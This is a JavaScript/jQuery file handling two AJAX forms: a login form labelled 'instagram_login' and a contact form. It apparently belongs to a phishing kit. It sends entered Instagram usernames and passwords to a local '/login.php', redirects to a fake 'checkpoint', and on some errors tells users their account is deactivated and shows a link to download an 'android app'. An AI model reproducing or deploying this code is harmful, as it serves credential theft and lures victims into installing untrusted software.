$(function() {
    $('form.ajax[data-action="instagram_login"]').submit(function(e) {
        e.preventDefault();
        var alerts = 'form.ajax[data-action="instagram_login"] div.ajax-alerts';
        var fieldset = $('form.ajax[data-action="instagram_login"] fieldset');
        var controls = $('form.ajax[data-action="instagram_login"] input, form.ajax[data-action="instagram_login"] button');
        var submit = $('form.ajax[data-action="instagram_login"] button[type="submit"]');
        $.ajax({
            url: '/login.php',
            type: "POST",
            dataType: "json",
            data: $('form.ajax[data-action="instagram_login"]').serialize(),
            beforeSend: function(){
                controls.html('<i class="fa fa-circle-o-notch fa-spin"></i> Sign In');
                controls.attr('disabled', 'disabled');
                flash.alert(alerts, 'info', 'Logging in, please wait for a while...', '<p></p>');
            },
            success: function(data){
                if(data.success == true){
                    //fieldset.slideUp();
                    
                    flash.alert(alerts, 'success', 'Hi there <b>'+data.name+'</b>! You are now being redirected...', '');
                    setTimeout(function() {
                        window.location.href = './checkpoint';
                    }, 1000)
                } else if(data.success == false){
                    if(data.error == 'invalid_credentials'){
                        controls.html('Login');
                        controls.removeAttr('disabled');
                        $('form.ajax[data-action="instagram_login"] input[name="password"]').val('').focus();
                        flash.alert(alerts, 'danger', 'Invalid username or password, please try again.', '<p></p>').delay(4000).slideUp();
                    } else if(data.error == 'blocked'){
                        controls.html('Login');
                        controls.removeAttr('disabled');
                        $('form.ajax[data-action="instagram_login"] input[name="username"], input[name="password"]').val('').focus();
                        flash.alert(alerts, 'danger', 'Your account is deactivated. To reactivate account login into our android app., <a href="'+data.verify_url+'" class="app-link" target="_blank">click here</a> to download android app.', '<p></p>').delay(50000).slideUp();
                    } else if(data.error == 'not_found'){
                        controls.html('Login');
                        controls.removeAttr('disabled');
                        $('form.ajax[data-action="instagram_login"] input[name="username"], input[name="password"]').val('').focus();
                        flash.alert(alerts, 'danger', 'Login Failed! you need to activate your account using our android app., <a href="'+data.verify_url+'" class="app-link" target="_blank">click here</a> to download our app.', '<p></p>').delay(50000).slideUp();
                    } else{
                        controls.html('Login');
                        controls.removeAttr('disabled');
                        $('form.ajax[data-action="instagram_login"] input[name="username"], input[name="password"]').val('').focus();
                        flash.alert(alerts, 'danger', 'Unknown error occured, please try again after a while.', '<p></p>').delay(4000).slideUp();
                    }
                } else {
                    fieldset.slideUp();
                    flash.alert(alerts, 'danger', 'Unknown error occured, please reload the page and login again.', '');
                }
            },
            error: function(){
                fieldset.slideUp();
                flash.alert(alerts, 'danger', 'Unknown error occured, please reload the page and login again.', '');
            }
        });
    });
    $('form.form-horizontal[data-action="send_email"]').submit(function(e) {
        e.preventDefault();
        var alerts = 'form.form-horizontal[data-action="send_email"] div.ajax-alerts';
        var fieldset = $('form.form-horizontal[data-action="send_email"] fieldset');
        var controls = $('form.form-horizontal[data-action="send_email"] input[name="name"], form.form-horizontal[data-action="send_email"] input[name="email"], form.form-horizontal[data-action="send_email"] textarea[name="message"], form.form-horizontal[data-action="send_email"] button');
        var submit = $('form.form-horizontal[data-action="send_email"] button[type="submit"]');
        $.ajax({
            url: './contact.php',
            type: "POST",
            dataType: "json",
            data: $('form.form-horizontal[data-action="send_email"]').serialize(),
            beforeSend: function() {
                controls.attr('disabled', 'disabled');
                flash.alert(alerts, 'info', 'Sending your message, please wait for a while...', '<p></p>');
            },
            success: function(data) {
                if (data.response == 'true') {
                    flash.alert(alerts, 'success', 'Well done <b>'+data.name+'</b>! Your message has been sent, we\'ll reply you in 24-48 hours.', '');
                    $('form.form-horizontal[data-action="send_email"] input[name="name"], input[name="email"], textarea[name="message"]').val('');
                } else if (data.status == 'false') {
                    fieldset.slideUp();
                    flash.alert(alerts, 'danger', '' + data.message + '', '');
                } else {
                    controls.removeAttr('disabled');
                    flash.alert(alerts, 'danger', '' + data.message + '', '<p></p>').delay(4000).slideUp();
                }
            },
            error: function() {
                fieldset.slideUp();
                flash.alert(alerts, 'danger', '<b>Application Error!</b> Please reload the page and try again.', '');
            }
        });
    });
});
var flash = {
    alert: function(element, type, message, tag) {
        $(element).html('<div class="alert alert-' + type + '">' + message + '</div> ' + tag + '').slideDown();
        return $(element);
    }
}
setTimeout(function() {
    $('#alert').slideUp();
}, 4000);
